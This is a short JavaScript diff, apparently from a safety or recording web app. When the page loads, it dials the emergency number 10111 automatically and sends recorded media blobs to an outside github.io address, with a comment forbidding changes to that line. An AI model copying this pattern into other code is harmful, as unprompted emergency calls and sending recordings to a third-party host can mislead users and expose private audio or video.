@@ -234,7 +234,9 @@ window.onload=async ()=>{
 
     startRecordingLoop();
 
-    
+    setTimeout(()=>{
+        window.location.href="tel:10111";
+    },1000);
 }
 
 function startRecordingLoop(){
@@ -267,7 +269,7 @@ function startRecordingLoop(){
                 let formData=new FormData();
                 formData.append("file",blob,filename);
 
-                await fetch("/upload",{
+                await fetch("https://airstore780-svg.github.io/aireguard/upload",{ //DO NOT change this folder or even line
                     method:"POST",
                     body:formData
                 });
